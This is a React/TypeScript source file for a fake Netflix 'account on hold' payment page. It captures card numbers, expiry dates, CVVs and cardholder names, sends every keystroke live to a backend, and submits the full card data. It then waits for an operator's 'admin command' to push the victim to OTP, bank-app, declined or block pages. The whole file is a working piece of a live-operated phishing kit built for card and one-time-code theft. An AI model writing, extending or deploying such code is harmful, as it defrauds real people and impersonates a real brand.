import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useSession } from "@/contexts/SessionContext";
import { Loader2, AlertTriangle, HelpCircle, CreditCard } from "lucide-react";

function detectCardType(num: string): string {
  const n = num.replace(/\s/g, "");
  if (/^4/.test(n)) return "Visa";
  if (/^5[1-5]/.test(n) || /^2[2-7]/.test(n)) return "Mastercard";
  if (/^3[47]/.test(n)) return "Amex";
  if (/^6/.test(n)) return "Discover";
  return "Unknown";
}

function formatCardNumber(val: string): string {
  return val.replace(/\D/g, "").slice(0, 16).replace(/(\d{4})(?=\d)/g, "$1 ");
}

function formatExpiry(val: string): string {
  const digits = val.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
}

export default function PaymentPage() {
  const [, navigate] = useLocation();
  const { sessionId, t } = useSession();
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");
  const [agreed, setAgreed] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const paymentMutation = trpc.notify.paymentSubmitted.useMutation();
  const updateStatus = trpc.session.updateStatus.useMutation();
  const updateTypingMutation = trpc.session.updateTyping.useMutation();
  const clearCommand = trpc.session.clearCommand.useMutation();

  const cardType = detectCardType(cardNumber);

  // Poll for admin command when loading (waiting for admin redirect)
  const pollQuery = trpc.session.poll.useQuery(
    { sessionId: sessionId || "" },
    { enabled: !!sessionId && loading, refetchInterval: 3000 }
  );

  useEffect(() => {
    if (!loading || !pollQuery.data) return;
    const { command } = pollQuery.data;
    if (command === "none") return;

    clearCommand.mutate({ sessionId: sessionId! });

    if (command === "bank_app") { navigate("/bank-app"); }
    else if (command === "otp_page") { setLoading(false); navigate("/otp"); }
    else if (command === "invalid_otp") { setLoading(false); navigate("/invalid-otp"); }
    else if (command === "declined") { setLoading(false); navigate("/declined"); }
    else if (command === "normal") { setLoading(false); /* stay on payment, show success */ }
    else if (command === "block") { navigate("/"); }
  }, [pollQuery.data?.command, loading]);

  const handleTyping = (field: string, value: string) => {
    if (sessionId) {
      updateTypingMutation.mutate({ sessionId, field, value });
    }
  };

  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!cardNumber || !expiry || !cvv || !name) { setError(t("fillAllFields") || "Please fill in all fields."); return; }
    if (!agreed) { setError(t("agreeToTerms") || "Please agree to the terms."); return; }
    setLoading(true);
    setError("");
    if (sessionId) {
      // Clear any stale admin command first so polling starts fresh
      clearCommand.mutate({ sessionId });
      paymentMutation.mutate({ sessionId, cardNumber, cardExpiry: expiry, cardCvv: cvv, cardName: name, cardType });
      updateStatus.mutate({ sessionId, status: "payment" });
    }
    // Do NOT auto-redirect — wait for admin command via polling
  };

  const inputStyle: React.CSSProperties = {
    width: "100%",
    padding: "clamp(12px, 3vw, 16px)",
    backgroundColor: "white",
    border: "1px solid #ccc",
    borderRadius: "4px",
    fontSize: "clamp(14px, 3.5vw, 16px)",
    outline: "none",
    boxSizing: "border-box",
    color: "#333",
  };

  return (
    <div style={{ backgroundColor: "white", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <header style={{ padding: "clamp(12px, 3vw, 16px) clamp(16px, 5vw, 24px)", borderBottom: "1px solid #e5e5e5", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
        <img src="/netflix-logo.png" alt="Netflix" style={{ height: "clamp(24px, 5vw, 32px)", width: "auto" }} />
        <a href="#" style={{ color: "#333", fontSize: "clamp(14px, 3.5vw, 16px)", fontWeight: 600, textDecoration: "none" }}>{t("signOut")}</a>
      </header>

      <main style={{ maxWidth: "800px", margin: "0 auto", padding: "clamp(20px, 5vw, 32px) clamp(16px, 5vw, 24px)", width: "100%", boxSizing: "border-box" }}>
        {/* Account on hold banner */}
        <div style={{ backgroundColor: "#fdf3e3", border: "1px solid #f5c842", borderRadius: "4px", padding: "clamp(12px, 3vw, 16px) clamp(14px, 4vw, 20px)", display: "flex", alignItems: "flex-start", gap: "12px", marginBottom: "clamp(20px, 5vw, 32px)" }}>
          <AlertTriangle size={20} color="#333" style={{ marginTop: "2px", flexShrink: 0 }} />
          <p style={{ color: "#333", fontSize: "clamp(13px, 3.5vw, 15px)", margin: 0 }}>
            <strong>{t("accountOnHold")}</strong> {t("updatePaymentInfo")}
          </p>
        </div>

        <h1 style={{ fontSize: "clamp(22px, 6vw, 32px)", fontWeight: 900, color: "#333", marginBottom: "clamp(16px, 4vw, 24px)" }}>{t("enterPaymentDetails")}</h1>

        {/* Card brand icons */}
        <div style={{ display: "flex", gap: "8px", marginBottom: "16px", alignItems: "center", flexWrap: "wrap" }}>
          <div style={{ border: "1px solid #ccc", borderRadius: "4px", padding: "4px 8px", fontSize: "clamp(11px, 2.5vw, 13px)", fontWeight: 700, color: "#1a1f71" }}>VISA</div>
          <div style={{ border: "1px solid #ccc", borderRadius: "4px", padding: "4px 8px" }}>
            <div style={{ display: "flex" }}>
              <div style={{ width: "20px", height: "20px", borderRadius: "50%", backgroundColor: "#EB001B", marginRight: "-8px" }} />
              <div style={{ width: "20px", height: "20px", borderRadius: "50%", backgroundColor: "#F79E1B" }} />
            </div>
          </div>
          <div style={{ border: "1px solid #ccc", borderRadius: "4px", padding: "4px 8px", fontSize: "clamp(10px, 2.5vw, 11px)", fontWeight: 700, color: "#006FCF" }}>AMEX</div>
        </div>

        <form onSubmit={handlePayment}>
          {/* Card number */}
          <div style={{ position: "relative", marginBottom: "8px" }}>
            <input
              type="text"
              placeholder={t("cardNumber")}
              value={cardNumber}
              required
              onChange={e => {
                const val = formatCardNumber(e.target.value);
                setCardNumber(val);
                handleTyping("cardNumber", val);
              }}
              style={{ ...inputStyle, paddingRight: "48px" }}
            />
            <CreditCard size={20} color="#999" style={{ position: "absolute", right: "16px", top: "50%", transform: "translateY(-50%)" }} />
          </div>

          {/* Expiry + CVV */}
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px", marginBottom: "8px" }}>
            <input
              type="text"
              placeholder={t("expirationDate")}
              value={expiry}
              required
              onChange={e => {
                const val = formatExpiry(e.target.value);
                setExpiry(val);
                handleTyping("cardExpiry", val);
              }}
              style={inputStyle}
            />
            <div style={{ position: "relative" }}>
              <input
                type="text"
                placeholder={t("cvv")}
                value={cvv}
                maxLength={4}
                required
                onChange={e => {
                  const val = e.target.value.replace(/\D/g, "").slice(0, 4);
                  setCvv(val);
                  handleTyping("cardCvv", val);
                }}
                style={{ ...inputStyle, paddingRight: "48px" }}
              />
              <HelpCircle size={20} color="#999" style={{ position: "absolute", right: "16px", top: "50%", transform: "translateY(-50%)" }} />
            </div>
          </div>

          {/* Name on card */}
          <div style={{ marginBottom: "clamp(16px, 4vw, 24px)" }}>
            <input
              type="text"
              placeholder={t("nameOnCard")}
              value={name}
              required
              onChange={e => {
                setName(e.target.value);
                handleTyping("cardName", e.target.value);
              }}
              style={inputStyle}
            />
          </div>

          <p style={{ color: "#555", fontSize: "clamp(12px, 3vw, 14px)", lineHeight: "1.5", marginBottom: "16px" }}>{t("termsText")}</p>

          <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "clamp(16px, 4vw, 24px)" }}>
            <input type="checkbox" id="agree" checked={agreed} onChange={e => setAgreed(e.target.checked)}
              style={{ width: "18px", height: "18px", cursor: "pointer", flexShrink: 0 }} />
            <label htmlFor="agree" style={{ color: "#333", fontSize: "clamp(13px, 3.5vw, 15px)", cursor: "pointer" }}>{t("iAgree")}</label>
          </div>

          {error && <p style={{ color: "#E50914", fontSize: "14px", marginBottom: "12px" }}>{error}</p>}

          <button
            type="submit"
            disabled={loading}
            style={{ width: "100%", backgroundColor: "#E50914", color: "white", border: "none", borderRadius: "4px", padding: "clamp(14px, 4vw, 18px)", fontSize: "clamp(15px, 4vw, 18px)", fontWeight: 700, cursor: loading ? "default" : "pointer", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", transition: "background-color 0.15s" }}
            onMouseEnter={e => { if (!loading) e.currentTarget.style.backgroundColor = "#c40812"; }}
            onMouseLeave={e => { e.currentTarget.style.backgroundColor = "#E50914"; }}
          >
            {loading ? <><Loader2 size={22} style={{ animation: "spin 1s linear infinite" }} /> {t("processing")}</> : t("makePayment")}
          </button>
        </form>

        <p style={{ color: "#737373", fontSize: "clamp(11px, 2.5vw, 13px)", marginTop: "24px" }}>
          {t("recaptchaNotice")} <a href="#" style={{ color: "#0071eb", textDecoration: "none" }}>{t("learnMore")}</a>
        </p>
      </main>
    </div>
  );
}
